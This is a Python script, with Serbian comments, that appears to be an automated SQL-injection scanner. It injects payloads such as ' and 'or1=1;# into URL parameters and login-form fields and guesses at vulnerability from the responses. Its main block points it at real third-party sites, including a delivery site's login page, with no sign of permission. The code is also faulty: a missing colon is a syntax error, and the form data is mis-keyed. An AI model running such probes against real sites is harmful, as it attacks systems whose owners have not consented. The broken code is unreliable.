import requests as req
from utils.levenshtein_distance import similarity
from collections import OrderedDict
from bs4 import BeautifulSoup

injection_patterns = ["'", "'or1=1;#", "'or1=1;--"]

initial_vulnerable_key_words = ['sql', 'database', 'odbc']

def inject_url(url: str, vulnerable_key_word: list, html_origin: str):
    global injection_patterns

    if('?' not in url):
        return None

    resp = req.get(url)
    #Razlaganje URL-a
    tail_url = ''
    url = resp.url
    if ('#' in url):
        tail_url = resp.url.split('#')[1]
        url = resp.url.split('#')[0]
    base_url = url.split('?')[0]
    parts = url.split('?')[1].split('&')
    
    for ip in injection_patterns:
        for i, p in enumerate(parts):
            tmp_parts = parts.copy()
            tmp_parts[i] = ''.join([p, ip])
            
            # Generisanje URL-a
            new_url = '&'.join(tmp_parts)
            new_url = '?'.join([base_url, new_url])
            new_url = '#'.join([new_url, tail_url])
    
            resp = req.get(new_url)
            html2 = resp.text
            for kw in vulnerable_key_word:
                if kw in html2:
                    return 'VULNERABLE'
            print(len(html2), len(html_origin))
            print(new_url)
            if(html2 != html_origin):
                if(similarity(html_origin, html2) < 0.4):
                    return 'VULNERABLE'
    return None

def inject_form(url: str, vulnerable_key_word: list, html_origin: str):
    global injection_patterns

    resp = req.get(url)
    soup = BeautifulSoup(html_origin, features='lxml')
    form = soup.find('form')
    inputs = form.find_all('input')
    htmls = [html_origin]
    for ip in injection_patterns:
        data = {}
        for i in inputs:
            data[i] = ip
        resp = req.post(form.get('action'), data=data)
        html2 = resp.text
        for kw in vulnerable_key_word:
            if kw in html2:
                return 'VULNERABLE'
            print(len(html2), len(html_origin))
            print(html2 not in htmls)
            if(html2 not in htmls):
                if(similarity(html_origin, html2) < 0.4):
                    return 'VULNERABLE'
                else:
                    htmls.append(html2)
    return 'NOT VULNERABLE'

def sql_injection_attack(url: str):
    global initial_vulnerable_key_words
    vulnerable_key_word = []
    resp = None
    try:
        resp = req.get(url)
    except:
        return 'Url not reachable'
    status_code = resp.status_code
    if(status_code >= 400 and status_code < 500):
        return 'Status code returned %s' %status_code
    html_origin = resp.text
    
    for kw in initial_vulnerable_key_words:
        if kw not in html_origin:
            vulnerable_key_word.append(kw)
    
    ret = inject_url(url, vulnerable_key_word, html_origin)
    if(ret is None)
        ret = inject_form(url, vulnerable_key_word, html_origin)
    return ret


if __name__ == '__main__':
    # print(inject_url('https://gebrauchtwagen.bmw.de/#/b/vehicles?manufacturers=221&series=21&variants=174'))
    # print(sql_injection_attack('http://old.etfbl.net/?c=prikazi&objekat=oglas#ploca_1'))
    print(sql_injection_attack('https://www.donesi.com/banjaluka/login.php'))
    
